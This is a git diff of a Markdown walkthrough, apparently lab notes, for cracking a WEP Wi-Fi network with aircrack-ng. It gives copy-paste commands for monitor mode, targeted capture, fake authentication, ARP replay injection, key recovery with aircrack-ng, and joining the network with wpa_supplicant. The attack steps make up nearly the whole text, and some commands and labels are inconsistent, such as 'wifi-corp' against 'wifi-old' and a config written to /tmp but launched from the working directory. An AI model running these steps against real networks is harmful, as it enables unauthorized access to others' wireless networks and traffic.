@@ -13,77 +13,120 @@ or
 ip link show wlan0
 ```
 
-then let's go!
+Then let's go!
 
 ```bash
 sudo airmon-ng check kill
 sudo airmon-ng start wlan0
 ```
 
-Enables monitor mode on `wlan0mon`.
+This will enables monitor mode on `wlan0mon`.
 
 ---
 
-## 🔍 1. Network Scanning
+## 🔍 Network Scanning
+
+At this point we want to scan the Network
 
 ```bash
 sudo airodump-ng wlan0mon
 ```
+With this command we want to identify WEP Network and grab:
 
-Identify:
 - `BSSID`
 - `Channel`
 - `Associated Clients` (STATION)
+
+**REMEMBER**: Check what AP’s are active on frequency band 2,4Ghz (WEP was never designed for the 5Ghz band).
+
+Also, all these info come together with all the other networks so it could be a little bit messy to keep analyzing things from here. 
+**We need to focus just on what we need. (press CTRL+C to stop the current monitor).** 
+
+So, let's run again airodump-ng targeting just the channel for the WEP Network.
 
 ---
 
 ## 🎯 2. Targeted Sniffing
 
 ```bash
-sudo airodump-ng --bssid <BSSID> -c <CH> -w dump wlan0mon
+channel=3
+sudo airodump-ng -c ${channel} wlan0mon
+```
+Note: It can take a while before a station connects. 
+Once you have it grab the CHANNEL, BSSID, ESSID, and the CLIENT we want to focus on in the attack step.
+
+```bash
+channel=3
+bssid='F0:9F:C2:71:22:11'
+essid='wifi-old'
+client='3E:C8:44:0A:24:BA'
 ```
 
-Collects IVs for cracking.
+Now we are ready to **Capture the Handshake**, in particular we will capture an **authentication handshake frame**.
 
 ---
 
-## 🔐 2. At the same time: Fake Auth (mandatory before injection)
+## Start the Attack
+
+In a new terminal tab. 
+Start monitoring specifically on AP ‘wifi-corp’ and dump the output in a capture file. Use copy and paste to execute the following command(s):
 
 ```bash
-sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
+channel=3
+bssid='F0:9F:C2:71:22:11'
+essid='wifi-old'
+client='3E:C8:44:0A:24:BA'
+
+sudo airodump-ng -c ${channel}  -w dump-wep --output-format pcap,csv --essid ${essid} --bssid ${bssid} wlan0mon
 ```
 
 ---
 
-## 💣 3. (Optional) Deauth Attack
+## 💣 De-AUTH
+
+In a second terminal tab. 
+Send a deauthentication frame. 
+In that case the connected client will try to re-authenticate again during our capture.
+
 
 ```bash
-sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
+bssid='F0:9F:C2:71:22:11'
+essid='wifi-old'
+client='3E:C8:44:0A:24:BA'
+
+sudo aireplay-ng -1 3600 -q 10 -a ${bssid} -e ${essid} -c ${client} wlan0mon
 ```
 
-Forces a client to reconnect and trigger ARP traffic.
+This forces a client to reconnect and trigger ARP traffic.
 
----
+When you see **Association Succesfull :-)** press CTRL+C to stop the De-Auth process
 
-## 🚀 4. At the same time: ARP Replay Attack
-
+In the same terminal generate traffic in order to find duplicate IV’s
 
 ```bash
-sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
+bssid='F0:9F:C2:71:22:11'
+essid='wifi-old'
+client='3E:C8:44:0A:24:BA'
+
+sudo aireplay-ng -3 -b ${bssid} -h ${client} wlan0mon
 ```
 
-Injects ARP requests to increase `#Data`.
-`-h` needs **your** MAC not a random one. We are pretending to be a legitimate client.
+**And when you captured at least 10.000 ARP requests, return to terminal 1 and press CTRL+C to stop airodump.**
 
+Also, stop monitoring on wlan0mon
+
+```bash
+sudo airmon-ng stop wlan0mon
+```
 ---
 
-## 🔓 5. At the same time: Crack the WEP Key
+## 🔓 Crack the WEP Key
 
-When you see 20.000–30.000 IV in the `#Data` column you need to:
+Use aircrack to crack the WEP authentication request. 
 
 
 ```bash
-aircrack-ng dump-01.cap
+aircrack-ng dump-wep-01.cap
 ```
 
 Expected result:
@@ -93,24 +136,33 @@ KEY FOUND! [ 12:34:56:78:90 ]
 ```
 ---
 
-## 🔌 6. Connect Using wpa_supplicant
+## 🔌 Connect Using wpa_supplicant
 
 ### wep.conf
 
-```ini
-network={
-    ssid="wifi-old"
-    key_mgmt=NONE
-    wep_key0="1234567890"
-    wep_tx_keyidx=0
-}
+# create a WEP connection file
+```bash
+wep_key=11BB33CD55 #you need to remove the colons
+essid='wifi-old'
+cat << EOF > /tmp/wep.conf
+ network={
+           ssid="${essid}"
+           key_mgmt=NONE
+           wep_key0=${wep_key}
+           wep_tx_keyidx=0
+          }
+EOF
 ```
+---
 
 ### Launch
 
 ```bash
-sudo airmon-ng stop wlan0mon
-sudo wpa_supplicant -i wlan0 -c wep.conf -D nl80211
+sudo wpa_supplicant -i wlan0 -c wep.conf
+```
+and in another terminal 
+
+```bash
 sudo dhclient wlan0 -v
 ```
 
@@ -119,8 +171,8 @@ sudo dhclient wlan0 -v
 ## ✅ 7. Verify Connection
 
 ```bash
-ip a
-ping 192.168.1.1
+target=192.168.1.1
+curl http://${target}/proof.txt
 ```
 
 ---
